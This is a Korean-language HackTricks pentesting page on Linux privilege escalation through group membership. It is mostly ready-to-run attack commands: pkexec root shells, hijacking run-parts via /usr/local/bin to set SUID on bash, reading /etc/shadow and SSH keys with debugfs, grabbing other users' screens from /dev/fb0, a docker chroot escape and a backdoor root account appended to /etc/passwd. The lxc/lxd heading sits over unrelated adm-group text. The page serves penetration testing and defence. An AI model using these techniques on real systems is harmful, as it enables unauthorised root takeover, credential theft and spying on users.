# 흥미로운 그룹 - Linux Privilege Escalation

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)를 통해 제로부터 AWS 해킹을 배우세요</strong>!</summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나 HackTricks를 PDF로 다운로드하길 원한다면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 저희의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [Discord 그룹](https://discord.gg/hRep4RUj7f)** 또는 [텔레그램 그룹](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## Sudo/Admin 그룹

### **PE - 방법 1**

**가끔**, **기본적으로 (또는 어떤 소프트웨어가 필요로 하는 경우)** **/etc/sudoers** 파일 내에 다음과 같은 줄을 찾을 수 있습니다:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
이는 **sudo 또는 admin 그룹에 속한 모든 사용자가 sudo로 모든 것을 실행할 수 있다는 것을 의미**합니다.

이 경우, **루트로 변환하려면 다음을 실행하면 됩니다**:
```
sudo su
```
### PE - 방법 2

모든 suid 이진 파일을 찾아 **Pkexec** 바이너리가 있는지 확인하십시오:
```bash
find / -perm -4000 2>/dev/null
```
만약 **pkexec 바이너리가 SUID 바이너리**이고 **sudo** 또는 **admin** 그룹에 속해 있다면, `pkexec`를 사용하여 바이너리를 sudo 권한으로 실행할 수 있습니다.\
일반적으로 이 그룹들이 **polkit 정책** 내에 포함되어 있기 때문입니다. 이 정책은 주로 어떤 그룹이 `pkexec`를 사용할 수 있는지 식별합니다. 다음 명령어로 확인할 수 있습니다:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
다음은 어떤 그룹이 **pkexec**를 실행할 수 있는지 및 **기본적으로** 일부 리눅스 배포판에서 **sudo** 및 **admin** 그룹이 나타나는 것을 확인할 수 있습니다.

**루트로 전환하려면 실행할 수 있습니다**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
만약 **pkexec**를 실행하려고 시도하고 다음 **오류**가 발생한다면:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**권한이 없는 것이 아니라 GUI 없이 연결되지 않았기 때문입니다**. 이 문제에 대한 해결책이 있습니다: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). **다른 2개의 ssh 세션이 필요합니다**:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## Wheel 그룹

**가끔**, **기본적으로** **/etc/sudoers** 파일 안에 이 줄을 찾을 수 있습니다:
```
%wheel	ALL=(ALL:ALL) ALL
```
이는 **wheel 그룹에 속한 모든 사용자가 sudo로 모든 것을 실행할 수 있다는 것을 의미**합니다.

이 경우, **루트가 되려면 다음을 실행하면 됩니다**:
```
sudo su
```
## 그림자 그룹

**그림자 그룹**의 사용자는 **/etc/shadow** 파일을 **읽을** 수 있습니다:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
## 직원 그룹

**staff**: 사용자가 루트 권한이 필요하지 않고 시스템(`/usr/local`)에 로컬 수정 사항을 추가할 수 있게 합니다 (`/usr/local/bin`에 있는 실행 파일은 모든 사용자의 PATH 변수에 있으며, 동일한 이름의 `/bin` 및 `/usr/bin`에 있는 실행 파일을 "덮어쓸" 수 있습니다). 모니터링/보안과 관련된 그룹 "adm"과 비교하십시오. [\[원본 자료\]](https://wiki.debian.org/SystemGroups)

데비안 배포판에서 `$PATH` 변수는 특권 사용자 여부에 관계없이 `/usr/local/`이 가장 높은 우선 순위로 실행됨을 보여줍니다.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
만약 `/usr/local`에서 일부 프로그램을 탈취할 수 있다면 루트 권한을 쉽게 얻을 수 있습니다.

`run-parts` 프로그램을 탈취하는 것은 루트 권한을 얻기 쉬운 방법입니다. 왜냐하면 대부분의 프로그램이 `run-parts`를 실행하기 때문입니다(crontab, ssh 로그인 시).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
또는 새로운 ssh 세션 로그인 시.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**악용**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## 디스크 그룹

이 권한은 거의 **루트 액세스와 동등**하며 기계 내의 모든 데이터에 액세스할 수 있습니다.

파일: `/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
**주의:** debugfs를 사용하여 **파일을 작성**할 수도 있습니다. 예를 들어 `/tmp/asd1.txt`를 `/tmp/asd2.txt`로 복사하려면 다음을 수행할 수 있습니다:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
그러나 **루트 소유의 파일을 쓰려고** 시도하면 (`/etc/shadow` 또는 `/etc/passwd`와 같은) "**허가 거부**" 오류가 발생합니다.

## 비디오 그룹

명령어 `w`를 사용하여 **시스템에 로그인한 사용자를** 찾을 수 있으며, 다음과 같은 출력이 표시됩니다:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1**은 사용자 **yossi가 머신의 터미널에 물리적으로 로그인**되어 있는 것을 의미합니다.

**video 그룹**은 화면 출력을 볼 수 있는 권한을 갖고 있습니다. 기본적으로 화면을 관찰할 수 있습니다. 이를 위해서는 화면의 현재 이미지를 raw 데이터로 **캡처**하고 화면이 사용 중인 해상도를 얻어야 합니다. 화면 데이터는 `/dev/fb0`에 저장될 수 있으며 이 화면의 해상도는 `/sys/class/graphics/fb0/virtual_size`에서 확인할 수 있습니다.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**원본 이미지**를 열려면 **GIMP**을 사용하여 \*\*`screen.raw` \*\* 파일을 선택하고 파일 유형으로 **Raw image data**를 선택할 수 있습니다:

![](<../../../.gitbook/assets/image (463).png>)

그런 다음 너비와 높이를 화면에서 사용하는 값으로 수정하고 다양한 이미지 유형을 확인하고 (화면을 더 잘 보여주는 것을 선택):

![](<../../../.gitbook/assets/image (317).png>)

## 루트 그룹

기본적으로 **루트 그룹의 구성원**은 **일부 서비스 구성 파일을 수정**하거나 **일부 라이브러리 파일을 수정**하거나 **권한 상승에 사용될 수 있는 기타 흥미로운 것들**에 액세스할 수 있을 것으로 보입니다...

**루트 구성원이 수정할 수 있는 파일을 확인하세요**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker 그룹

인스턴스의 볼륨에 호스트 머신의 루트 파일 시스템을 **마운트**할 수 있으므로 인스턴스가 시작되면 해당 볼륨에 `chroot`가 즉시 로드됩니다. 이로써 머신에서 root 액세스를 얻을 수 있습니다.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
## lxc/lxd 그룹

일반적으로 **`adm`** 그룹의 **구성원**은 _/var/log/_ 내에 있는 **로그 파일을 읽을 수 있는 권한**을 가지고 있습니다.\
따라서, 이 그룹 내의 사용자를 침해했다면 **로그를 확인**해야 합니다.

## Auth 그룹

OpenBSD 내에서 **auth** 그룹은 일반적으로 _**/etc/skey**_ 및 _**/var/db/yubikey**_ 폴더에 쓸 수 있습니다.\
이러한 권한은 다음 exploit을 사용하여 **루트 권한 상승**에 악용될 수 있습니다: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
